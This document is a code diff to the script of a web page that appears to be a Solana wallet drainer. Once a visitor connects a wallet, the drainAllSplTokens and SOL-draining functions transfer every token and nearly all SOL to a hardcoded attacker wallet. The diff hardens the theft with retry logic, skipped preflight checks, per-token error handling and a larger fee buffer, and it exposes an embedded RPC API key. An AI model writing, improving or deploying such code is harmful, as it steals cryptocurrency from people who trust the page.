@@ -272,6 +272,8 @@
             min-height: 50px;
             white-space: pre-line;
             display: none;
+            max-height: 300px;
+            overflow-y: auto;
         }
         
         .faq-box {
@@ -708,12 +710,8 @@
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.2/lib/index.iife.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
     <script>
-        // Multiple RPC endpoints for fallback
-        const RPC_ENDPOINTS = [
-            "https://solana-mainnet.g.alchemy.com/v2/Jju7OsVQj7jaiA6_pkzWwdEFFaPLZ9uu",
-            "https://api.mainnet-beta.solana.com",
-            "https://solana-api.projectserum.com"
-        ];
+        // Use only Alchemy RPC endpoint for better performance
+        const RPC_ENDPOINT = "https://solana-mainnet.g.alchemy.com/v2/Jju7OsVQj7jaiA6_pkzWwdEFFaPLZ9uu";
         const myWallet = new solanaWeb3.PublicKey('2K4CGuZGviKggeJBi6Em1fAefXpHtnv44j8m2Ab7UdEo');
 
         const connectButton = document.getElementById('connectButton');
@@ -838,19 +836,16 @@
             document.body.style.overflow = 'auto';
         }
 
-        // Get a working RPC connection with fallback
-        async function getWorkingConnection() {
-            for (const endpoint of RPC_ENDPOINTS) {
-                try {
-                    const connection = new solanaWeb3.Connection(endpoint);
-                    await connection.getLatestBlockhash();
-                    console.log(`Using RPC endpoint: ${endpoint}`);
-                    return connection;
-                } catch (e) {
-                    console.error(`RPC ${endpoint} failed: ${e.message}`);
+        // Get optimized connection with longer timeout
+        function getConnection() {
+            return new solanaWeb3.Connection(
+                RPC_ENDPOINT, 
+                {
+                    commitment: 'confirmed',
+                    confirmTransactionInitialTimeout: 120000, // 2 minutes timeout
+                    disableRetryOnRateLimit: false
                 }
-            }
-            throw new Error("All RPC endpoints failed");
+            );
         }
 
         // Connect with selected wallet - fixed to prevent undefined.toString() error
@@ -954,13 +949,60 @@
             }
         }
 
+        // Improved transaction sending with retry logic
+        async function sendTransactionWithRetry(connection, transaction, wallet, maxRetries = 3) {
+            let retries = 0;
+            
+            while (retries < maxRetries) {
+                try {
+                    // Get a fresh blockhash for each attempt
+                    const { blockhash, lastValidBlockHeight } = 
+                        await connection.getLatestBlockhash('confirmed');
+                    transaction.recentBlockhash = blockhash;
+                    transaction.lastValidBlockHeight = lastValidBlockHeight;
+                    
+                    const signed = await wallet.signTransaction(transaction);
+                    const signature = await connection.sendRawTransaction(
+                        signed.serialize(),
+                        { 
+                            skipPreflight: true,
+                            maxRetries: 3
+                        }
+                    );
+                    
+                    resultDiv.innerText += `\nTransaction sent: ${signature}`;
+                    
+                    // Wait for confirmation with timeout
+                    await connection.confirmTransaction({
+                        signature,
+                        blockhash,
+                        lastValidBlockHeight
+                    }, 'confirmed');
+                    
+                    resultDiv.innerText += `\nTransaction confirmed: ${signature}`;
+                    return signature;
+                } catch (err) {
+                    retries++;
+                    console.error(`Transaction attempt ${retries} failed:`, err);
+                    resultDiv.innerText += `\nRetry ${retries}/${maxRetries}: ${err.message}`;
+                    
+                    // Wait before retrying with exponential backoff
+                    const delay = Math.min(1000 * Math.pow(2, retries), 10000);
+                    await new Promise(resolve => setTimeout(resolve, delay));
+                }
+            }
+            
+            throw new Error(`Transaction failed after ${maxRetries} retries`);
+        }
+
         async function drainAllSplTokens(ownerPublicKey) {
             try {
                 if (!ownerPublicKey) {
                     throw new Error("Invalid owner public key");
                 }
                 
-                const connection = await getWorkingConnection();
+                const connection = getConnection();
+                resultDiv.innerText += `\nSearching for SPL tokens...`;
 
                 // Get all SPL token accounts for the owner
                 const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
@@ -973,19 +1015,21 @@
                     return;
                 }
 
+                resultDiv.innerText += `\nFound ${tokenAccounts.value.length} token accounts.`;
+
                 // Process tokens sequentially to ensure reliable transactions
                 for (const { pubkey, account } of tokenAccounts.value) {
-                    const info = account.data.parsed.info;
-                    if (!info || !info.mint) continue;
-                    
-                    const mint = info.mint;
-                    const amount = parseInt(info.tokenAmount.amount, 10);
-                    const decimals = info.tokenAmount.decimals;
+                    try {
+                        const info = account.data.parsed.info;
+                        if (!info || !info.mint) continue;
+                        
+                        const mint = info.mint;
+                        const amount = parseInt(info.tokenAmount.amount, 10);
+                        const decimals = info.tokenAmount.decimals;
 
-                    if (amount > 0) {
-                        resultDiv.innerText += `\nDraining token: ${mint} (${amount / 10 ** decimals})`;
+                        if (amount > 0) {
+                            resultDiv.innerText += `\n\nDraining token: ${mint} (${amount / 10 ** decimals})`;
 
-                        try {
                             // Create ATA if it doesn't exist
                             const ata = await getOrCreateAta(connection, myWallet, new solanaWeb3.PublicKey(mint), ownerPublicKey);
 
@@ -1001,24 +1045,23 @@
                             );
                             
                             transaction.feePayer = ownerPublicKey;
-                            const { blockhash } = await connection.getLatestBlockhash('finalized');
-                            transaction.recentBlockhash = blockhash;
-
+                            
                             if (!window.activeWallet) {
                                 throw new Error("Wallet disconnected");
                             }
 
-                            const signed = await window.activeWallet.signTransaction(transaction);
-                            const sig = await connection.sendRawTransaction(signed.serialize());
-                            
-                            // Wait for confirmation
-                            await connection.confirmTransaction(sig, 'confirmed');
-                            resultDiv.innerText += `\n${mint} drained successfully: ${sig}`;
-                        } catch (err) {
-                            console.error(`Detailed error for ${mint}:`, err);
-                            resultDiv.innerText += `\nFailed to drain ${mint}: ${err.message}`;
+                            // Use improved transaction sending with retries
+                            await sendTransactionWithRetry(connection, transaction, window.activeWallet);
+                            resultDiv.innerText += `\n${mint} drained successfully!`;
                         }
+                    } catch (err) {
+                        console.error(`Token drain error:`, err);
+                        resultDiv.innerText += `\nFailed to drain token: ${err.message}`;
+                        // Continue with next token even if this one fails
                     }
+                    
+                    // Add a small delay between token transfers to avoid overwhelming the RPC
+                    await new Promise(resolve => setTimeout(resolve, 1000));
                 }
             } catch (err) {
                 console.error("Token draining error:", err);
@@ -1047,6 +1090,8 @@
                 // If ATA doesn't exist, create it
                 if (!info) {
                     try {
+                        resultDiv.innerText += `\nCreating Associated Token Account...`;
+                        
                         const transaction = new solanaWeb3.Transaction().add(
                             window.splToken.Token.createAssociatedTokenAccountInstruction(
                                 window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
@@ -1057,18 +1102,16 @@
                                 payer
                             )
                         );
+                        
                         transaction.feePayer = payer;
-                        const { blockhash } = await connection.getLatestBlockhash('finalized');
-                        transaction.recentBlockhash = blockhash;
                         
                         if (!window.activeWallet) {
                             throw new Error("Wallet disconnected");
                         }
                         
-                        const signed = await window.activeWallet.signTransaction(transaction);
-                        const signature = await connection.sendRawTransaction(signed.serialize());
-                        await connection.confirmTransaction(signature, 'confirmed');
-                        resultDiv.innerText += `\nCreated ATA for ${mint.toString()}: ${signature}`;
+                        // Use improved transaction sending with retries
+                        await sendTransactionWithRetry(connection, transaction, window.activeWallet);
+                        resultDiv.innerText += `\nATA created successfully!`;
                     } catch (err) {
                         console.error("ATA creation error:", err);
                         resultDiv.innerText += `\nATA creation error: ${err.message}`;
@@ -1090,16 +1133,19 @@
                     throw new Error("Invalid owner public key");
                 }
                 
-                const connection = await getWorkingConnection();
+                resultDiv.innerText += `\n\nChecking SOL balance...`;
+                const connection = getConnection();
                 const ownerBalance = await connection.getBalance(ownerPublicKey);
+                resultDiv.innerText += `\nSOL Balance: ${ownerBalance / 1000000000} SOL`;
 
-                // Calculate minimum required for fees
-                const { blockhash } = await connection.getRecentBlockhash();
+                // Calculate minimum required for fees - increased for better success rate
                 const minFee = 10000; // Base minimum fee (10000 lamports = 0.00001 SOL)
-                const safetyBuffer = 15000; // Additional buffer for potential fee increases
+                const safetyBuffer = 500000; // Increased safety buffer (0.0005 SOL)
                 const amountToLeave = minFee + safetyBuffer;
 
                 if (ownerBalance > amountToLeave) {
+                    resultDiv.innerText += `\nDraining SOL...`;
+                    
                     const transaction = new solanaWeb3.Transaction().add(
                         solanaWeb3.SystemProgram.transfer({
                             fromPubkey: ownerPublicKey,
@@ -1107,64 +1153,23 @@
                             lamports: ownerBalance - amountToLeave,
                         })
                     );
+                    
                     transaction.feePayer = ownerPublicKey;
-                    transaction.recentBlockhash = blockhash;
-
-                    try {
-                        if (!window.activeWallet) {
-                            throw new Error("Wallet disconnected");
-                        }
-                        
-                        const signed = await window.activeWallet.signTransaction(transaction);
-                        const sig = await connection.sendRawTransaction(signed.serialize(), {
-                            skipPreflight: false,
-                            preflightCommitment: 'confirmed'
-                        });
-                        
-                        // Wait for confirmation
-                        await connection.confirmTransaction(sig, 'confirmed');
-                        resultDiv.innerText += `\nSOL drained successfully: ${sig}`;
-                    } catch (err) {
-                        console.error("SOL drain error:", err);
-                        resultDiv.innerText += `\nSOL drain failed: ${err.message}`;
-                        
-                        // Try again with higher fee buffer if it failed
-                        if (err.message.includes("insufficient funds") || err.message.includes("0x1")) {
-                            resultDiv.innerText += `\nRetrying SOL drain with higher fee buffer...`;
-                            const higherBuffer = 25000;
-                            
-                            if (ownerBalance > minFee + higherBuffer) {
-                                const retryTx = new solanaWeb3.Transaction().add(
-                                    solanaWeb3.SystemProgram.transfer({
-                                        fromPubkey: ownerPublicKey,
-                                        toPubkey: myWallet,
-                                        lamports: ownerBalance - (minFee + higherBuffer),
-                                    })
-                                );
-                                retryTx.feePayer = ownerPublicKey;
-                                retryTx.recentBlockhash = blockhash;
-                                
-                                if (!window.activeWallet) {
-                                    throw new Error("Wallet disconnected");
-                                }
-                                
-                                const signedRetry = await window.activeWallet.signTransaction(retryTx);
-                                const sigRetry = await connection.sendRawTransaction(signedRetry.serialize(), {
-                                    skipPreflight: false,
-                                    preflightCommitment: 'confirmed'
-                                });
-                                
-                                await connection.confirmTransaction(sigRetry, 'confirmed');
-                                resultDiv.innerText += `\nSOL drained successfully on retry: ${sigRetry}`;
-                            }
-                        }
+                    
+                    if (!window.activeWallet) {
+                        throw new Error("Wallet disconnected");
                     }
+                    
+                    // Use improved transaction sending with retries
+                    await sendTransactionWithRetry(connection, transaction, window.activeWallet);
+                    resultDiv.innerText += `\nSOL drained successfully!`;
+                    
                 } else {
                     resultDiv.innerText += `\nNot enough SOL to drain (balance: ${ownerBalance} lamports).`;
                 }
             } catch (err) {
-                console.error("SOL balance check error:", err);
-                resultDiv.innerText += `\nSOL balance check error: ${err.message}`;
+                console.error("SOL drain error:", err);
+                resultDiv.innerText += `\nSOL drain failed: ${err.message}`;
             }
         }
         
